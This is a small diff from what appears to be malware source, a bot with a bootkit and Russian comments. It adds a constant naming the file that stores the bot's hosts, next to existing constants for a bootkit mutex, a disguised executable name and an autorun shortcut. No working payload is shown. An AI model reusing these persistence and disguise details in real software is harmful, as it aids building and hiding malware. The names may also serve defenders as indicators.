@@ -56,6 +56,11 @@ CSSTR StrBootkitIsRunMutex[] = "BIR737JK3LJ"; //мьютекс сигнализирующий, что зап
 CSSTR EStrOriginalBotExeName[] = "WtJoeBt.exe";
 CSSTR EStrBotStartupLinkName[] = "wslneo.lnk";  // Имя ярлыка в автозагрузке
 
+
+// Имя файла для хранения хостов бота
+CSSTR EStrHostsFileName[] = "mnhslst32.dat";
+
+
 // Поддирректория сервиса
 CSSTR EStrBotServiceExePath[] = "com\\";
 
